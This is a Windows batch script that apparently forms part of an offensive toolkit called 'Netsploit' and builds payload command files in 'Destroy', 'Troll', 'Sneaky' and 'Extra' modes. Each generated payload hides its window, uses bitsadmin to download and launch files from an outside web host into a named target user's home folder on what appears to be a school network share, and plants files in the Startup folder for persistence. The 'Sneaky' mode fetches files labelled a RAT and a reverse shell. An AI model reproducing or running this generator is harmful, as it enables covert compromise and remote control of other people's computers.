@echo off
IF NOT EXIST "%~dp0..\Generated\" (
    MKDIR "%~dp0..\Generated"
)
cls

IF "%mode%" EQU "Destroy" goto Destroy
IF "%mode%" EQU "Troll" goto Troll
IF "%mode%" EQU "Sneaky" goto Sneaky
IF "%mode%" EQU "Extra" goto Extra

goto end

:Destroy

echo @echo off >> "%~dp0..\Generated\%optional%.cmd"
echo color a >> "%~dp0..\Generated\%optional%.cmd"
echo cls >> "%~dp0..\Generated\%optional%.cmd"
echo IF "%%minimized%%" NEQ "" goto :minimized >> "%~dp0..\Generated\%optional%.cmd"
echo set minimized=true >> "%~dp0..\Generated\%optional%.cmd"
echo start /min cmd /k "%%~dpnx0" >> "%~dp0..\Generated\%optional%.cmd"
echo exit >> "%~dp0..\Generated\%optional%.cmd"
echo :minimized >> "%~dp0..\Generated\%optional%.cmd"
echo set "cdm=\\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"DownloadOpenPyw^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/open.txt" "%%cdm%%\open.pyw" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"DownloadMP^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/JBT.mp3" "%%cdm%%\JBT.mp3" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/Summoner.txt" "%%cdm%%\Summoner.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/turnup.txt" "%%cdm%%\turnup.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/turnup.vbs" "%%cdm%%\turnup.vbs" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Netsploit/Paysploit/BootExec.txt" "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\BootExec.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\turnup.cmd >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\open.pyw >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\Summoner.cmd >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo Exit /b 333 >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
Echo Generated Payload in Netsploit\Generated Named %optional%.cmd
timeout /t 3 >nul
goto end

:Troll
echo @echo off >> "%~dp0..\Generated\%optional%.cmd"
echo color a >> "%~dp0..\Generated\%optional%.cmd"
echo cls >> "%~dp0..\Generated\%optional%.cmd"
echo IF "%%minimized%%" NEQ "" goto :minimized >> "%~dp0..\Generated\%optional%.cmd"
echo set minimized=true >> "%~dp0..\Generated\%optional%.cmd"
echo start /min cmd /k "%%~dpnx0" >> "%~dp0..\Generated\%optional%.cmd"
echo exit >> "%~dp0..\Generated\%optional%.cmd"
echo :minimized >> "%~dp0..\Generated\%optional%.cmd"
echo set "cdm=\\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"DownloadOpenPyw^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/open.txt" "%%cdm%%\open.pyw" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"DownloadMP^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/JBT.mp3" "%%cdm%%\JBT.mp3" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/Summoner.txt" "%%cdm%%\Summoner.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/turnup.txt" "%%cdm%%\turnup.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/turnup.vbs" "%%cdm%%\turnup.vbs" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Netsploit/Paysploit/BootExec.txt" "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\BootExec.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\turnup.cmd >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\open.pyw >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\Summoner.cmd >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo Exit /b 333 >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
Echo Generated Payload in Netsploit\Generated Named %optional%.cmd
timeout /t 3 >nul
goto end

:Sneaky
echo @echo off >> "%~dp0..\Generated\%optional%.cmd"
echo color a >> "%~dp0..\Generated\%optional%.cmd"
echo cls >> "%~dp0..\Generated\%optional%.cmd"
echo IF "%%minimized%%" NEQ "" goto :minimized >> "%~dp0..\Generated\%optional%.cmd"
echo set minimized=true >> "%~dp0..\Generated\%optional%.cmd"
echo start /min cmd /k "%%~dpnx0" >> "%~dp0..\Generated\%optional%.cmd"
echo exit >> "%~dp0..\Generated\%optional%.cmd"
echo :minimized >> "%~dp0..\Generated\%optional%.cmd"
echo set "cdm=\\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"DownloadRAT^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/Client.txt" "%%cdm%%\Client.pyw" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"DownloadReverseShell^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/Hook.txt" "%%cdm%%\Hook.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Netsploit/Paysploit/BootExec.txt" "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\Client.pyw" >> "%~dp0..\Generated\%optional%.cmd"
echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Netsploit/Paysploit/BootExec.txt" "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\Hook.txt" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\Client.pyw >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\Hook.cmd >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
echo Exit /b 333 >> "%~dp0..\Generated\%optional%.cmd" >> "%~dp0..\Generated\%optional%.cmd"
Echo Generated Payload in Netsploit\Generated Named %optional%.cmd
timeout /t 3 >nul
goto end

:Extra

echo @echo off >> H:\Netsploit\Generated\%optional%.cmd
echo color a >> H:\Netsploit\Generated\%optional%.cmd
echo IF "%minimized%" NEQ "" goto :minimized >> H:\Netsploit\Generated\%optional%.cmd
echo set minimized=true >> H:\Netsploit\Generated\%optional%.cmd
echo start /min cmd /k "%%~dpnx0" >> H:\Netsploit\Generated\%optional%.cmd
echo exit >> H:\Netsploit\Generated\%optional%.cmd
echo :minimized >> H:\Netsploit\Generated\%optional%.cmd
echo set "cdm=\\HELMWFS0001.HELM.EDU.SFFM\HomeS$\\%target%\\Downloads" >> H:\Netsploit\Generated\%optional%.cmd
pause
pause
pause

IF "%Extra1%" EQU "ON" echo bitsadmin /transfer ^"DownloadOpenPyw^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/open.txt" "%%cdm%%\open.pyw" >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra2%" EQU "ON" echo bitsadmin /transfer ^"DownloadMP^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/JBT.mp3" "%%cdm%%\JBT.mp3" >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra2%" EQU "ON" echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/turnup.txt" "%%cdm%%\turnup.cmd" >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra2%" EQU "ON" echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/turnup.vbs" "%%cdm%%\turnup.vbs" >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra3%" EQU "ON" echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Jebaited/Summoner.txt" "%%cdm%%\Summoner.cmd" >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra4%" EQU "ON" echo bitsadmin /transfer ^"^" /download /priority high "https://thatcodeshower.000webhostapp.com/Netsploit/Paysploit/BootExec.txt" "%%appdata%%\Microsoft\Windows\Start Menu\Programs\Startup\BootExec.cmd" >> "%~dp0..\Generated\%optional%.cmd"

IF "%Extra2%" EQU "ON" echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\turnup.cmd >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra1%" EQU "ON" echo start /min \\HELMWFS0001.HELM.EDU.SFFM\HomeS$\%target%\Downloads\open.pyw >> "%~dp0..\Generated\%optional%.cmd"
IF "%Extra3%" EQU "ON" echo start /min \\HELMWFS0001.HELM.EDU.SFFM\\HomeS$\%target%\Downloads\Summoner.cmd >> "%~dp0..\Generated\%optional%.cmd"

echo Exit /b 333 >> "%~dp0..\Generated\%optional%.cmd"

Echo Generated Payload in Netsploit\Generated Named %optional%.cmd
timeout /t 3 >nul
goto end

:end
PAUSE